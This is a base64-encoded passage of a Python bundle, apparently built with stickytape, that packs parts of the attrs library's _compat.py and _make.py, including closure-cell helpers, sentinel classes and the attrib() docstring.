AgICAgICAjIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhhdCBjZWxsLlxuICAgICAgICAgICAgc2V0dGVyID0gdHlwZXMuRnVuY3Rpb25UeXBlKFxuICAgICAgICAgICAgICAgIHNldF9maXJzdF9mcmVldmFyX2NvZGUsIHt9LCAic2V0dGVyIiwgKCksIChjZWxsLClcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgICMgQW5kIGNhbGwgaXQgdG8gc2V0IHRoZSBjZWxsLlxuICAgICAgICAgICAgc2V0dGVyKHZhbHVlKVxuXG4gICAgICAgICMgTWFrZSBzdXJlIGl0IHdvcmtzIG9uIHRoaXMgaW50ZXJwcmV0ZXI6XG4gICAgICAgIGRlZiBtYWtlX2Z1bmNfd2l0aF9jZWxsKCk6XG4gICAgICAgICAgICB4ID0gTm9uZVxuXG4gICAgICAgICAgICBkZWYgZnVuYygpOlxuICAgICAgICAgICAgICAgIHJldHVybiB4ICAjIHByYWdtYTogbm8gY292ZXJcblxuICAgICAgICAgICAgcmV0dXJuIGZ1bmNcblxuICAgICAgICBpZiBQWTI6XG4gICAgICAgICAgICBjZWxsID0gbWFrZV9mdW5jX3dpdGhfY2VsbCgpLmZ1bmNfY2xvc3VyZVswXVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgY2VsbCA9IG1ha2VfZnVuY193aXRoX2NlbGwoKS5fX2Nsb3N1cmVfX1swXVxuICAgICAgICBzZXRfY2xvc3VyZV9jZWxsKGNlbGwsIDEwMClcbiAgICAgICAgaWYgY2VsbC5jZWxsX2NvbnRlbnRzICE9IDEwMDpcbiAgICAgICAgICAgIHJhaXNlIEFzc2VydGlvbkVycm9yICAjIHByYWdtYTogbm8gY292ZXJcblxuICAgIGV4Y2VwdCBFeGNlcHRpb246XG4gICAgICAgIHJldHVybiBqdXN0X3dhcm5cbiAgICBlbHNlOlxuICAgICAgICByZXR1cm4gc2V0X2Nsb3N1cmVfY2VsbFxuXG5cbnNldF9jbG9zdXJlX2NlbGwgPSBtYWtlX3NldF9jbG9zdXJlX2NlbGwoKVxuXG4jIFRocmVhZC1sb2NhbCBnbG9iYWwgdG8gdHJhY2sgYXR0cnMgaW5zdGFuY2VzIHdoaWNoIGFyZSBhbHJlYWR5IGJlaW5nIHJlcHJcJ2QuXG4jIFRoaXMgaXMgbmVlZGVkIGJlY2F1c2UgdGhlcmUgaXMgbm8gb3RoZXIgKHRocmVhZC1zYWZlKSB3YXkgdG8gcGFzcyBpbmZvXG4jIGFib3V0IHRoZSBpbnN0YW5jZXMgdGhhdCBhcmUgYWxyZWFkeSBiZWluZyByZXByXCdkIHRocm91Z2ggdGhlIGNhbGwgc3RhY2tcbiMgaW4gb3JkZXIgdG8gZW5zdXJlIHdlIGRvblwndCBwZXJmb3JtIGluZmluaXRlIHJlY3Vyc2lvbi5cbiNcbiMgRm9yIGluc3RhbmNlLCBpZiBhbiBpbnN0YW5jZSBjb250YWlucyBhIGRpY3Qgd2hpY2ggY29udGFpbnMgdGhhdCBpbnN0YW5jZSxcbiMgd2UgbmVlZCB0byBrbm93IHRoYXQgd2VcJ3JlIGFscmVhZHkgcmVwclwnaW5nIHRoZSBvdXRzaWRlIGluc3RhbmNlIGZyb20gd2l0aGluXG4jIHRoZSBkaWN0XCdzIHJlcHIoKSBjYWxsLlxuI1xuIyBUaGlzIGxpdmVzIGhlcmUgcmF0aGVyIHRoYW4gaW4gX21ha2UucHkgc28gdGhhdCB0aGUgZnVuY3Rpb25zIGluIF9tYWtlLnB5XG4jIGRvblwndCBoYXZlIGEgZGlyZWN0IHJlZmVyZW5jZSB0byB0aGUgdGhyZWFkLWxvY2FsIGluIHRoZWlyIGdsb2JhbHMgZGljdC5cbiMgSWYgdGhleSBoYXZlIHN1Y2ggYSByZWZlcmVuY2UsIGl0IGJyZWFrcyBjbG91ZHBpY2tsZS5cbnJlcHJfY29udGV4dCA9IHRocmVhZGluZy5sb2NhbCgpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9fbWFrZS5weScsIGInIyBTUERYLUxpY2Vuc2UtSWRlbnRpZmllcjogTUlUXG5cbmZyb20gX19mdXR1cmVfXyBpbXBvcnQgYWJzb2x1dGVfaW1wb3J0LCBkaXZpc2lvbiwgcHJpbnRfZnVuY3Rpb25cblxuaW1wb3J0IGNvcHlcbmltcG9ydCBpbnNwZWN0XG5pbXBvcnQgbGluZWNhY2hlXG5pbXBvcnQgc3lzXG5pbXBvcnQgd2FybmluZ3NcblxuZnJvbSBvcGVyYXRvciBpbXBvcnQgaXRlbWdldHRlclxuXG4jIFdlIG5lZWQgdG8gaW1wb3J0IF9jb21wYXQgaXRzZWxmIGluIGFkZGl0aW9uIHRvIHRoZSBfY29tcGF0IG1lbWJlcnMgdG8gYXZvaWRcbiMgaGF2aW5nIHRoZSB0aHJlYWQtbG9jYWwgaW4gdGhlIGdsb2JhbHMgaGVyZS5cbmZyb20gLiBpbXBvcnQgX2NvbXBhdCwgX2NvbmZpZywgc2V0dGVyc1xuZnJvbSAuX2NvbXBhdCBpbXBvcnQgKFxuICAgIEhBU19GX1NUUklOR1MsXG4gICAgUFkyLFxuICAgIFBZMzEwLFxuICAgIFBZUFksXG4gICAgaXNjbGFzcyxcbiAgICBpdGVyaXRlbXMsXG4gICAgbWV0YWRhdGFfcHJveHksXG4gICAgbmV3X2NsYXNzLFxuICAgIG9yZGVyZWRfZGljdCxcbiAgICBzZXRfY2xvc3VyZV9jZWxsLFxuKVxuZnJvbSAuZXhjZXB0aW9ucyBpbXBvcnQgKFxuICAgIERlZmF1bHRBbHJlYWR5U2V0RXJyb3IsXG4gICAgRnJvemVuSW5zdGFuY2VFcnJvcixcbiAgICBOb3RBbkF0dHJzQ2xhc3NFcnJvcixcbiAgICBQeXRob25Ub29PbGRFcnJvcixcbiAgICBVbmFubm90YXRlZEF0dHJpYnV0ZUVycm9yLFxuKVxuXG5cbmlmIG5vdCBQWTI6XG4gICAgaW1wb3J0IHR5cGluZ1xuXG5cbiMgVGhpcyBpcyB1c2VkIGF0IGxlYXN0IHR3aWNlLCBzbyBjYWNoZSBpdCBoZXJlLlxuX29ial9zZXRhdHRyID0gb2JqZWN0Ll9fc2V0YXR0cl9fXG5faW5pdF9jb252ZXJ0ZXJfcGF0ID0gIl9fYXR0cl9jb252ZXJ0ZXJfJXMiXG5faW5pdF9mYWN0b3J5X3BhdCA9ICJfX2F0dHJfZmFjdG9yeV97fSJcbl90dXBsZV9wcm9wZXJ0eV9wYXQgPSAoXG4gICAgIiAgICB7YXR0cl9uYW1lfSA9IF9hdHRyc19wcm9wZXJ0eShfYXR0cnNfaXRlbWdldHRlcih7aW5kZXh9KSkiXG4pXG5fY2xhc3N2YXJfcHJlZml4ZXMgPSAoXG4gICAgInR5cGluZy5DbGFzc1ZhciIsXG4gICAgInQuQ2xhc3NWYXIiLFxuICAgICJDbGFzc1ZhciIsXG4gICAgInR5cGluZ19leHRlbnNpb25zLkNsYXNzVmFyIixcbilcbiMgd2UgZG9uXCd0IHVzZSBhIGRvdWJsZS11bmRlcnNjb3JlIHByZWZpeCBiZWNhdXNlIHRoYXQgdHJpZ2dlcnNcbiMgbmFtZSBtYW5nbGluZyB3aGVuIHRyeWluZyB0byBjcmVhdGUgYSBzbG90IGZvciB0aGUgZmllbGRcbiMgKHdoZW4gc2xvdHM9VHJ1ZSlcbl9oYXNoX2NhY2hlX2ZpZWxkID0gIl9hdHRyc19jYWNoZWRfaGFzaCJcblxuX2VtcHR5X21ldGFkYXRhX3NpbmdsZXRvbiA9IG1ldGFkYXRhX3Byb3h5KHt9KVxuXG4jIFVuaXF1ZSBvYmplY3QgZm9yIHVuZXF1aXZvY2FsIGdldGF0dHIoKSBkZWZhdWx0cy5cbl9zZW50aW5lbCA9IG9iamVjdCgpXG5cbl9uZ19kZWZhdWx0X29uX3NldGF0dHIgPSBzZXR0ZXJzLnBpcGUoc2V0dGVycy5jb252ZXJ0LCBzZXR0ZXJzLnZhbGlkYXRlKVxuXG5cbmNsYXNzIF9Ob3RoaW5nKG9iamVjdCk6XG4gICAgIiIiXG4gICAgU2VudGluZWwgY2xhc3MgdG8gaW5kaWNhdGUgdGhlIGxhY2sgb2YgYSB2YWx1ZSB3aGVuIGBgTm9uZWBgIGlzIGFtYmlndW91cy5cblxuICAgIGBgX05vdGhpbmdgYCBpcyBhIHNpbmdsZXRvbi4gVGhlcmUgaXMgb25seSBldmVyIG9uZSBvZiBpdC5cblxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMjEuMS4wIGBgYm9vbChOT1RISU5HKWBgIGlzIG5vdyBGYWxzZS5cbiAgICAiIiJcblxuICAgIF9zaW5nbGV0b24gPSBOb25lXG5cbiAgICBkZWYgX19uZXdfXyhjbHMpOlxuICAgICAgICBpZiBfTm90aGluZy5fc2luZ2xldG9uIGlzIE5vbmU6XG4gICAgICAgICAgICBfTm90aGluZy5fc2luZ2xldG9uID0gc3VwZXIoX05vdGhpbmcsIGNscykuX19uZXdfXyhjbHMpXG4gICAgICAgIHJldHVybiBfTm90aGluZy5fc2luZ2xldG9uXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiTk9USElORyJcblxuICAgIGRlZiBfX2Jvb2xfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBkZWYgX19sZW5fXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuIDAgICMgX19ib29sX18gZm9yIFB5dGhvbiAyXG5cblxuTk9USElORyA9IF9Ob3RoaW5nKClcbiIiIlxuU2VudGluZWwgdG8gaW5kaWNhdGUgdGhlIGxhY2sgb2YgYSB2YWx1ZSB3aGVuIGBgTm9uZWBgIGlzIGFtYmlndW91cy5cbiIiIlxuXG5cbmNsYXNzIF9DYWNoZUhhc2hXcmFwcGVyKGludCk6XG4gICAgIiIiXG4gICAgQW4gaW50ZWdlciBzdWJjbGFzcyB0aGF0IHBpY2tsZXMgLyBjb3BpZXMgYXMgTm9uZVxuXG4gICAgVGhpcyBpcyB1c2VkIGZvciBub24tc2xvdHMgY2xhc3NlcyB3aXRoIGBgY2FjaGVfaGFzaD1UcnVlYGAsIHRvIGF2b2lkXG4gICAgc2VyaWFsaXppbmcgYSBwb3RlbnRpYWxseSAoZXZlbiBsaWtlbHkpIGludmFsaWQgaGFzaCB2YWx1ZS4gU2luY2UgYGBOb25lYGBcbiAgICBpcyB0aGUgZGVmYXVsdCB2YWx1ZSBmb3IgdW5jYWxjdWxhdGVkIGhhc2hlcywgd2hlbmV2ZXIgdGhpcyBpcyBjb3BpZWQsXG4gICAgdGhlIGNvcHlcJ3MgdmFsdWUgZm9yIHRoZSBoYXNoIHNob3VsZCBhdXRvbWF0aWNhbGx5IHJlc2V0LlxuXG4gICAgU2VlIEdIICM2MTMgZm9yIG1vcmUgZGV0YWlscy5cbiAgICAiIiJcblxuICAgIGlmIFBZMjpcbiAgICAgICAgIyBGb3Igc29tZSByZWFzb24gYHR5cGUoTm9uZSlgIGlzblwndCBjYWxsYWJsZSBpbiBQeXRob24gMiwgYnV0IHdlIGRvblwndFxuICAgICAgICAjIGFjdHVhbGx5IG5lZWQgYSBjb25zdHJ1Y3RvciBmb3IgTm9uZSBvYmplY3RzLCB3ZSBqdXN0IG5lZWQgYW55XG4gICAgICAgICMgYXZhaWxhYmxlIGZ1bmN0aW9uIHRoYXQgcmV0dXJucyBOb25lLlxuICAgICAgICBkZWYgX19yZWR1Y2VfXyhzZWxmLCBfbm9uZV9jb25zdHJ1Y3Rvcj1nZXRhdHRyLCBfYXJncz0oMCwgIiIsIE5vbmUpKTpcbiAgICAgICAgICAgIHJldHVybiBfbm9uZV9jb25zdHJ1Y3RvciwgX2FyZ3NcblxuICAgIGVsc2U6XG5cbiAgICAgICAgZGVmIF9fcmVkdWNlX18oc2VsZiwgX25vbmVfY29uc3RydWN0b3I9dHlwZShOb25lKSwgX2FyZ3M9KCkpOlxuICAgICAgICAgICAgcmV0dXJuIF9ub25lX2NvbnN0cnVjdG9yLCBfYXJnc1xuXG5cbmRlZiBhdHRyaWIoXG4gICAgZGVmYXVsdD1OT1RISU5HLFxuICAgIHZhbGlkYXRvcj1Ob25lLFxuICAgIHJlcHI9VHJ1ZSxcbiAgICBjbXA9Tm9uZSxcbiAgICBoYXNoPU5vbmUsXG4gICAgaW5pdD1UcnVlLFxuICAgIG1ldGFkYXRhPU5vbmUsXG4gICAgdHlwZT1Ob25lLFxuICAgIGNvbnZlcnRlcj1Ob25lLFxuICAgIGZhY3Rvcnk9Tm9uZSxcbiAgICBrd19vbmx5PUZhbHNlLFxuICAgIGVxPU5vbmUsXG4gICAgb3JkZXI9Tm9uZSxcbiAgICBvbl9zZXRhdHRyPU5vbmUsXG4pOlxuICAgICIiIlxuICAgIENyZWF0ZSBhIG5ldyBhdHRyaWJ1dGUgb24gYSBjbGFzcy5cblxuICAgIC4uICB3YXJuaW5nOjpcblxuICAgICAgICBEb2VzICpub3QqIGRvIGFueXRoaW5nIHVubGVzcyB0aGUgY2xhc3MgaXMgYWxzbyBkZWNvcmF0ZWQgd2l0aFxuICAgICAgICBgYXR0ci5zYCFcblxuICAgIDpwYXJhbSBkZWZhdWx0OiBBIHZhbHVlIHRoYXQgaXMgdXNlZCBpZiBhbiBgYGF0dHJzYGAtZ2VuZXJhdGVkIGBgX19pbml0X19gYFxuICAgICAgICBpcyB1c2VkIGFuZCBubyB2YWx1ZSBpcyBwYXNzZWQgd2hpbGUgaW5zdGFudGlhdGluZyBvciB0aGUgYXR0cmlidXRlIGlzXG4gICAgICAgIGV4Y2x1ZGVkIHVzaW5nIGBgaW5pdD1GYWxzZWBgLlxuXG4gICAgICAgIElmIHRoZSB2YWx1ZSBpcyBhbiBpbnN0YW5jZSBvZiBgYXR0cnMuRmFjdG9yeWAsIGl0cyBjYWxsYWJsZSB3aWxsIGJlXG4gICAgICAgIHVzZWQgdG8gY29uc3RydWN0IGEgbmV3IHZhbHVlICh1c2VmdWwgZm9yIG11dGFibGUgZGF0YSB0eXBlcyBsaWtlIGxpc3RzXG4gICAgICAgIG9yIGRpY3RzKS5cblxuICAgICAgICBJZiBhIGRlZmF1bHQgaXMgbm90IHNldCAob3Igc2V0IG1hbnVhbGx5IHRvIGBhdHRycy5OT1RISU5HYCksIGEgdmFsdWVcbiAgICAgICAgKm11c3QqIGJlIHN1cHBsaWVkIHdoZW4gaW5zdGFudGlhdGluZzsgb3RoZXJ3aXNlIGEgYFR5cGVFcnJvcmBcbiAgICAgICAgd2lsbCBiZSByYWlzZWQuXG5cbiAgICAgICAgVGhlIGRlZmF1bHQgY2FuIGFsc28gYmUgc2V0IHVzaW5nIGRlY29yYXRvciBub3RhdGlvbiBhcyBzaG93biBiZWxvdy5cblxuICAgIDp0eXBlIGRlZmF1bHQ6IEFueSB2YWx1ZVxuXG4gICAgOnBhcmFtIGNhbGxhYmxlIGZhY3Rvcnk6IFN5bnRhY3RpYyBzdWdhciBmb3JcbiAgICAgICAgYGBkZWZhdWx0PWF0dHIuRmFjdG9yeShmYWN0b3J5KWBgLlxuXG4gICAgOnBhcmFtIHZhbGlkYXRvcjogYGNhbGxhYmxlYCB0aGF0IGlzIGNhbGxlZCBieSBgYGF0dHJzYGAtZ2VuZXJhdGVkXG4gICAgICAgIGBgX19pbml0X19gYCBtZXRob2RzIGFmdGVyIHRoZSBpbnN0YW5jZSBoYXMgYmVlbiBpbml0aWFsaXplZC4gIFRoZXlcbiAgICAgICAgcmVjZWl2ZSB0aGUgaW5pdGlhbGl6ZWQgaW5zdGFuY2UsIHRoZSA6ZnVuYzpgfmF0dHJzLkF0dHJpYnV0ZWAsIGFuZCB0aGVcbiAgICAgICAgcGFzc2VkIHZhbHVlLlxuXG4gICAgICAgIFRoZSByZXR1cm4gdmFsdWUgaXMgKm5vdCogaW5zcGVjdGVkIHNvIHRoZSB2YWxpZGF0b3IgaGFzIHRvIHRocm93IGFuXG4gICAgICAgIGV4Y2VwdGlvbiBpdHNlbGYuXG5cbiAgICAgICAgSWYgYSBgbGlzdGAgaXMgcGFzc2VkLCBpdHMgaXRlbXMgYXJlIHRyZWF0ZWQgYXMgdmFsaWRhdG9ycyBhbmQgbXVzdFxuICAgICAgICBhbGwgcGFzcy5cblxuICAgICAgICBWYWxpZGF0b3JzIGNhbiBiZSBnbG9iYWxseSBkaXNhYmxlZCBhbmQgcmUtZW5hYmxlZCB1c2luZ1xuICAgICAgICBgZ2V0X3J1bl92YWxpZGF0b3JzYC5cblxuICAgICAgICBUaGUgdmFsaWRhdG9yIGNhbiBhbHNvIGJlIHNldCB1c2luZyBkZWNvcmF0b3Igbm90YXRpb24gYXMgc2hvd24gYmVsb3cuXG5cbiAgICA6dHlwZSB2YWxpZGF0b3I6IGBjYWxsYWJsZWAgb3IgYSBgbGlzdGAgb2YgYGNhbGxhYmxlYFxcXFwgcy5cblxuICAgIDpwYXJhbSByZXByOiBJbmNsdWRlIHRoaXMgYXR0cmlidXRlIGluIHRoZSBnZW5lcmF0ZWQgYGBfX3JlcHJfX2BgXG4gICAgICAgIG1ldGhvZC4gSWYgYGBUcnVlYGAsIGluY2x1ZGUgdGhlIGF0dHJpYnV0ZTsgaWYgYGBGYWxzZWBgLCBvbWl0IGl0LiBCeVxuICAgICAgICBkZWZhdWx0LCB0aGUgYnVpbHQtaW4gYGByZXByKClgYCBmdW5jdGlvbiBpcyB1c2VkLiBUbyBvdmVycmlkZSBob3cgdGhlXG4gICAgICAgIGF0dHJpYnV0ZSB2YWx1ZSBpcyBmb3JtYXR0ZWQsIHBhc3MgYSBgYGNhbGxhYmxlYGAgdGhhdCB0YWtlcyBhIHNpbmdsZVxuICAgICAgICB2YWx1ZSBhbmQgcmV0dXJucyBhIHN0cmluZy4gTm90ZSB0aGF0IHRoZSByZXN1bHRpbmcgc3RyaW5nIGlzIHVzZWRcbiAgICAgICAgYXMtaXMsIGkuZS4gaXQgd2lsbCBiZSB1c2VkIGRpcmVjdGx5ICppbnN0ZWFkKiBvZiBjYWxsaW5nIGBgcmVwcigpYGBcbiAgICAgICAgKHRoZSBkZWZhdWx0KS5cbiAgICA6dHlwZSByZXByOiBhIGBib29sYCBvciBhIGBjYWxsYWJsZWAgdG8gdXNlIGEgY3VzdG9tIGZ1bmN0aW9uLlxuXG4gICAgOnBhcmFtIGVxOiBJZiBgYFRydWVgYCAoZGVmYXVsdCksIGluY2x1ZGUgdGhpcyBhdHRyaWJ1dGUgaW4gdGhlXG4gICAgICAgIGdlbmVyYXRlZCBgYF9fZXFfX2BgIGFuZCBgYF9fbmVfX2BgIG1ldGhvZHMgdGhhdCBjaGVjayB0d28gaW5zdGFuY2VzXG4gICAgICAgIGZvciBlcXVhbGl0eS4gVG8gb3ZlcnJpZGUgaG93IHRoZSBhdHRyaWJ1dGUgdmFsdWUgaXMgY29tcGFyZWQsXG4gICAgICAgIHBhc3MgYSBgYGNhbGxhYmxlYGAgdGhhdCB0YWtlcyBhIHNpbmdsZSB2YWx1ZSBhbmQgcmV0dXJucyB0aGUgdmFsdWVcbiAgICAgICAgdG8gYmUgY29tcGFyZWQuXG4gICAgOnR5cGUgZXE6IGEgYGJvb2xgIG9yIGEgYGNhbGxhYmxlYC5cblxuICAgIDpwYXJhbSBvcmRlcjogSWYgYGBUcnVlYGAgKGRlZmF1bHQpLCBpbmNsdWRlIHRoaXMgYXR0cmlidXRlcyBpbiB0aGVcbiAgICAgICAgZ2VuZXJhdGVkIGBgX19sdF9fYGAsIGBgX19sZV9fYGAsIGBgX19ndF9fYGAgYW5kIGBgX19nZV9fYGAgbWV0aG9kcy5cbiAgICAgICAgVG8gb3ZlcnJpZGUgaG93IHRoZSBhdHRyaWJ1dGUgdmFsdWUgaXMgb3JkZXJlZCxcbiAgICAgICAgcGFzcyBhIGBgY2FsbGFibGVgYCB0aGF0IHRha2VzIGEgc2luZ2xlIHZhbHVlIGFuZCByZXR1cm5zIHRoZSB2YWx1ZVxuICAgICAgICB0byBiZSBvcmRlcmVkLlxuICAgIDp0eXBlIG9yZGVyOiBhIGBib29sYCBvciBhIGBjYWxsYWJsZWAuXG5cbiAgICA6cGFyYW0gY21wOiBTZXR0aW5nICpjbXAqIGlzIGVxdWl2YWxlbnQgdG8gc2V0dGluZyAqZXEqIGFuZCAqb3JkZXIqIHRvIHRoZVxuICAgICAgICBzYW1lIHZhbHVlLiBNdXN0IG5vdCBiZSBtaXhlZCB3aXRoICplcSogb3IgKm9yZGVyKi5cbiAgICA6dHlwZSBjbXA6IGEgYGJvb2xgIG9yIGEgYGNhbGxhYmxlYC5cblxuICAgIDpwYXJhbSBPcHRpb25hbFtib29sXSBoYXNoOiBJbmNsdWRlIHRoaXMgYXR0cmlidXRlIGluIHRoZSBnZW5lcmF0ZWRcbiAgICAgICAgYGBfX2hhc2hfX2BgIG1ldGhvZC4gIElmIGBgTm9uZWBgIChkZWZhdWx0KSwgbWlycm9yICplcSpcJ3MgdmFsdWUuICBUaGlzXG4gICAgICAgIGlzIHRoZSBjb3JyZWN0IGJlaGF2aW9yIGFjY29yZGluZyB0aGUgUHl0aG9uIHNwZWMuICBTZXR0aW5nIHRoaXMgdmFsdWVcbiAgICAgICAgdG8gYW55dGhpbmcgZWxzZSB0aGFuIGBgTm9uZWBgIGlzICpkaXNjb3VyYWdlZCouXG4gICAgOnBhcmFtIGJvb2wgaW5pdDogSW5jbHVkZSB0aGlzIGF0dHJpYnV0ZSBpbiB0aGUgZ2VuZXJhdGVkIGBgX19pbml0X19gYFxuICAgICAgICBtZXRob2QuICBJdCBpcyBwb3NzaWJsZSB0byBzZXQgdGhpcyB0byBgYEZhbHNlYGAgYW5kIHNldCBhIGRlZmF1bHRcbiAgICAgICAgdmFsdWUuICBJbiB0aGF0IGNhc2UgdGhpcyBhdHRyaWJ1dGVkIGlzIHVuY29uZGl0aW9uYWxseSBpbml0aWFsaXplZFxuICAgICAgICB3aXRoIHRoZSBzcGVjaWZpZWQgZGVmYXVsdCB2YWx1ZSBvciBmYWN0b3J5LlxuICAgIDpwYXJhbSBjYWxsYWJsZSBjb252ZXJ0ZXI6IGBjYWxsYWJsZWAgdGhhdCBpcyBjYWxsZWQgYnlcbiAgICAgICAgYGBhdHRyc2BgLWdlbmVyYXRlZCBgYF9faW5pdF9fYGAgbWV0aG9kcyB0byBjb252ZXJ0IGF0dHJpYnV0ZVwncyB2YWx1ZVxuICAgICAgICB0byB0aGUgZGVzaXJlZCBmb3JtYXQuICBJdCBpcyBnaXZlbiB0aGUgcGFzc2VkLWluIHZhbHVlLCBhbmQgdGhlXG4gICAgICAgIHJldHVybmVkIHZhbHVlIHdpbGwgYmUgdXNlZCBhcyB0aGUgbmV3IHZhbHVlIG9mIHRoZSBhdHRyaWJ1dGUuICBUaGVcbiAgICAgICAgdmFsdWUgaXMgY29udmVydGVkIGJlZm9yZSBiZWluZyBwYXNzZWQgdG8gdGhlIHZhbGlkYXRvciwgaWYgYW55LlxuICAgIDpwYXJhbSBtZXRhZGF0YTogQW4gYXJiaXRyYXJ5IG1hcHBpbmcsIHRvIGJlIHVzZWQgYnkgdGhpcmQtcGFydHlcbiAgICAgICAgY29tcG9uZW50cy4gIFNlZSBgZXh0ZW5kaW5nX21ldGFkYXRhYC5cbiAgICA6cGFyYW0gdHlwZTogVGhlIHR5cGUgb2YgdGhlIGF0dHJpYnV0ZS4gIEluIFB5dGhvbiAzLjYgb3IgZ3JlYXRlciwgdGhlXG4gICAgICAgIHByZWZlcnJlZCBtZXRob2QgdG8gc3BlY2lmeSB0aGUgdHlwZSBpcyB1c2luZyBhIHZhcmlhYmxlIGFubm90YXRpb25cbiAgICAgICAgKHNlZSBgUEVQIDUyNiA8aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDUyNi8+YF8pLlxuICAgICAgICBUaGlzIGFyZ3VtZW50IGlzIHByb3ZpZGVkIGZvciBiYWNrd2FyZCBjb21wYXRpYmlsaXR5LlxuICAgICAgICBSZWdhcmRsZXNzIG9mIHRoZSBhcHByb2FjaCB1c2VkLCB0aGUgdHlwZSB3aWxsIGJlIHN0b3JlZCBvblxuICAgICAgICBgYEF0dHJpYnV0ZS50eXBlYGAuXG5cbiAgICAgICAgUGxlYXNlIG5vdGUgdGhhdCBgYGF0dHJzYGAgZG9lc25cJ3QgZG8gYW55dGhpbmcgd2l0aCB0aGlzIG1ldGFkYXRhIGJ5XG4gICAgICAgIGl0c2VsZi4gWW91IGNhbiB1c2UgaXQgYXMgcGFydCBvZiB5b3VyIG93biBjb2RlIG9yIGZvclxuICAgICAgICBgc3RhdGljIHR5cGUgY2hlY2tpbmcgPHR5cGVzPmAuXG4gICAgOnBhcmFtIGt3X29ubHk6IE1ha2UgdGhpcyBhdHRyaWJ1dGUga2V5d29yZC1vbmx5IChQeXRob24gMyspXG4gICAgICAgIGluIHRoZSBnZW5lcmF0ZWQgYGBfX2luaXRfX2BgIChpZiBgYGluaXRgYCBpcyBgYEZhbHNlYGAsIHRoaXNcbiAgICAgICAgcGFyYW1ldGVyIGlzIGlnbm9yZWQpLlxuICAgIDpwYXJhbSBvbl9zZXRhdHRyOiBBbGxvd3MgdG8gb3ZlcndyaXRlIHRoZSAqb25fc2V0YXR0ciogc2V0dGluZyBmcm9tXG4gICAgICAgIGBhdHRyLnNgLiBJZiBsZWZ0IGBOb25lYCwgdGhlICpvbl9zZXRhdHRyKiB2YWx1ZSBmcm9tIGBhdHRyLnNgIGlzIHVzZWQuXG4gICAgICAgIFNldCB0byBgYXR0cnMuc2V0dGVycy5OT19PUGAgdG8gcnVuICoqbm8qKiBgc2V0YXR0cmAgaG9va3MgZm9yIHRoaXNcbiAgICAgICAgYXR0cmlidXRlIC0tIHJlZ2FyZGxlc3Mgb2YgdGhlIHNldHRpbmcgaW4gYGF0dHIuc2AuXG4gICAgOnR5cGUgb25fc2V0YXR0cjogYGNhbGxhYmxlYCwgb3IgYSBsaXN0IG9mIGNhbGxhYmxlcywgb3IgYE5vbmVgLCBvclxuICAgICAgICBgYXR0cnMuc2V0dGVycy5OT19PUGBcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE1LjIuMCAqY29udmVydCpcbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxNi4zLjAgKm1ldGFkYXRhKlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMTcuMS4wICp2YWxpZGF0b3IqIGNhbiBiZSBhIGBgbGlzdGBgIG5vdy5cbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDE3LjEuMFxuICAgICAgICpoYXNoKiBpcyBgYE5vbmVgYCBhbmQgdGhlcmVmb3JlIG1pcnJvcnMgKmVxKiBieSBkZWZhdWx0LlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE3LjMuMCAqdHlwZSpcbiAgICAuLiBkZXByZWNhdGVkOjogMTcuNC4wICpjb252ZXJ0KlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE3LjQuMCAqY29udmVydGVyKiBhcyBhIHJlcGxhY2VtZW50IGZvciB0aGUgZGVwcmVjYXRlZFxuICAgICAgICpjb252ZXJ0KiB0byBhY2hpZXZlIGNvbnNpc3RlbmN5IHdpdGggb3RoZXIgbm91bi1iYXNlZCBhcmd1bWVudHMuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTguMS4wXG4gICAgICAgYGBmYWN0b3J5PWZgYCBpcyBzeW50YWN0aWMgc3VnYXIgZm9yIGBgZGVmYXVsdD1hdHRyLkZhY3RvcnkoZilgYC5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOC4yLjAgKmt3X29ubHkqXG4gICAgLi4gdmVyc2lvbmNoYW5nZWQ6OiAxOS4yLjAgKmNvbnZlcnQqIGtleXdvcmQgYXJndW1lbnQgcmVtb3ZlZC5cbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDE5LjIuMCAqcmVwciogYWxzbyBhY2NlcHRzIGEgY3VzdG9tIGNhbGxhYmxlLlxuICAgIC4uIGRlcHJlY2F0ZWQ6OiAxOS4yLjAgKmNtcCogUmVtb3ZhbCBvbiBvciBhZnRlciAyMDIxLTA2LTAxLlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjIuMCAqZXEqIGFuZCAqb3JkZXIqXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wICpvbl9zZXRhdHRyKlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMjAuMy4wICprd19vbmx5KiBiYWNrcG9ydGVkIHRvIFB5dGhvbiAyXG4gICAgLi4gdmVyc2lvbmNoYW5nZWQ6OiAyMS4xLjBcbiAgICAgICAqZXEqLCAqb3JkZXIqLCBhbmQgKmNtcCogYWxzbyBhY2NlcHQgYSBjdXN0b20gY2FsbGFibGVcbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDIxLjEuMCAqY21wKiB1bmRlcHJlY2F0ZWRcbiAgICAiIiJcbiAgICBlcSwgZXFfa2V5LCBvcmRlciwgb3JkZXJfa2V5ID0gX2RldGVybWluZV9hdHRyaWJfZXFfb3JkZXIoXG4gICAgICAgIGNtcCwgZXEsIG9yZGVyLCBUcnVlXG4gICAgKVxuXG4gICAgaWYgaGFzaCBpcyBub3QgTm9uZSBhbmQgaGFzaCBpcyBub3QgVHJ1ZSBhbmQgaGFzaCBpcyBub3QgRmFsc2U6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgICAgICJJbnZhbGlkIHZhbHVlIGZvciBoYXNoLiAgTXVzdCBiZSBUcnVlLCBGYWxzZSwgb3